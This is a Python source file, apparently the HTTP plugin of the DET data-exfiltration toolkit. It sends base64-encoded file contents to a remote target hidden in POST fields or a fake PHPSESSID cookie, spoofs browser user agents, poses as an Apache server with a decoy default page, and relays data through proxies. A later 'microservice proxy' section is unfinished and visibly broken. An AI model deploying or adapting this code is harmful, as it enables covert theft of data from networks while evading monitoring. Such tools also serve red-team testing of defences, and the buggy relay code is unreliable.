from __future__ import print_function
import requests
import base64
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urllib
from random import choice
import platform
from det import get_next_data

host_os = platform.system()

if host_os == "Linux":
    user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
elif host_os == "Windows":
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
else:
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7"

headers = requests.utils.default_headers()
headers.update({'User-Agent': user_agent})

with open('plugins/misc/default_apache_page.html', 'r') as html_file:
    html_content = html_file.read()

config = None
app_exfiltrate = None

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content)

    def version_string(self):
        return 'Apache/2.4.10'

    def do_POST(self):
        self._set_headers()
        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        tmp = post_body.split('=', 1)
        if tmp[0] == "data":
            try:
                data = base64.b64decode(urllib.unquote(tmp[1]))
                self.server.handler(data)
            except Exception as e:
                print(e)
                pass

    def do_GET(self):
        try:
            string = '/'.join(self.path.split('/')[1:])
            self._set_headers()
            try:
                data = base64.b64decode(string)
                app_exfiltrate.retrieve_data(data)
            except Exception as e:
                pass
        except:
            self._set_headers()
            if self.headers.has_key('Cookie'):
                cookie = self.headers['Cookie']
                string = cookie.split('=', 1)[1].strip()
                try:
                    data = base64.b64decode(string)
                    app_exfiltrate.retrieve_data(data)
                    self.server.handler(data)
                except Exception as e:
                    print(e)
                    pass

def send(data):
    if config.has_key('proxies') and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
    	target = "http://{}:{}".format(choice(targets), config['port'])
    else:
    	target = "http://{}:{}".format(config['target'], config['port'])
    app_exfiltrate.log_message(
        'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
    #Randomly choose between GET and POST
    if choice([True, False]):
        data_to_send = {'data': base64.b64encode(data)}
        requests.post(target, data=data_to_send, headers=headers)
    else:
        cookies = dict(PHPSESSID=base64.b64encode(data))
        requests.get(target, cookies=cookies, headers=headers)

def relay_http_request(data):
    target = "http://{}:{}".format(config['target'], config['port'])
    app_exfiltrate.log_message(
        'info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
    #Randomly choose between GET and POST
    if choice([True, False]):
        data_to_send = {'data': base64.b64encode(data)}
        requests.post(target, data=data_to_send, headers=headers)
    else:
        cookies = dict(PHPSESSID=base64.b64encode(data))
        requests.get(target, cookies=cookies, headers=headers)

def server(data_handler):
    try:
        server_address = ('', config['port'])
        httpd = HTTPServer(server_address, S)
        httpd.handler = data_handler
        httpd.serve_forever()
    except:
        app_exfiltrate.log_message(
            'warning', "[http] Couldn't bind http daemon on port {}".format(config['port']))

def listen():
    app_exfiltrate.log_message('info', "[http] Starting httpd...")
    server(app_exfiltrate.retrieve_data)

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [http] Starting httpd...")
    server(relay_http_request)

###########################################################
###########################################################
## TODO: add dnscat capabilities here IMHO --- I honestly kinda forget how dnscat even works...
## todo: update headers (maybe take from config file or something like that) -- yah definitely... figure them out in advance??
    ## (but in an automated way...)
## todo: write new ms_sender function or something like that
## todo: TEST!!!

def microserivce_proxy(exfil_object):
    global app
    app = exfil_object
    app_exfiltrate.log_message('info', "[microservice_proxy] [http] Starting httpd...")
    server(relay_ms_request)

# note: this might actually end up being the same b/c I just added a janky try-except
# to the retrive data section
#def listen_ms():
#    app_exfiltrate.log_message('info', "[http] Starting httpd...")
#    server(app_exfiltrate.retrieve_data)

packet_counter = -1
file_to_send = None
f = None
app = None
def relay_ms_request(data):
    global packet_counter, file_to_send, f, app
    ### okay... this actuallyy looks very straightforward...
    # step 1: get path + current index out of data
    path_data = data['path_data']
    current_index = path_data['index']
    path=  path_data['path']
    # step 2: find the next point in path
    # step 3; if applicable, send to next position on path
    if current_index < len(path_data['path'].keys()):
        next_position = path[current_index + 1]
        next_ip = next_position['ip']
        next_port = next_position['port']
        data['path_data']['index'] +=1

    else: # if we reached the end of the line, then we gotta (1) get the data and (2) reverse the path and send it back
        # step (1) get the data.
        # step (2): reverse path and send it back
        data['path_data'] = [i for i in reversed(data['path_data'])]
        data['path_data']['index'] = 1
        next_ip = data['path_data'][1]['ip']
        next_port = data['path_data'][1]['port']
        # now put some actual data in there..
        ## OKAY, we are going to get janky with this...
        if not file_to_send:
            file_to_send = data['path_data']['file_to_end']
        cur_data,f_candidate = get_next_data(file_to_send, packet_counter, 'microservice_special', f, app.exfiltrate.key, 'xx2a')
        if f_candidate:
            f = f_candidate
        if data == None:
            packet_counter = - 1
            cur_data, f = get_next_data(file_to_send, packet_counter, 'microservice_special', f,
                                              app.exfiltrate.key, 'xx2a')

        data['from_file'] = cur_data

    packet_counter += 1
    data_to_send = {'data': base64.b64encode(data)}
    target = "http://{}:{}".format(next_ip, next_port)
    app_exfiltrate.log_message('info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
    requests.post(target, data=data_to_send, headers=headers)

###########################################################
###########################################################

class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app_exfiltrate = app
        app.register_plugin('http', {'send': send, 'listen': listen, 'proxy': proxy,
                                     "microserivce_proxy": microserivce_proxy,
                                     "listen_ms": listen})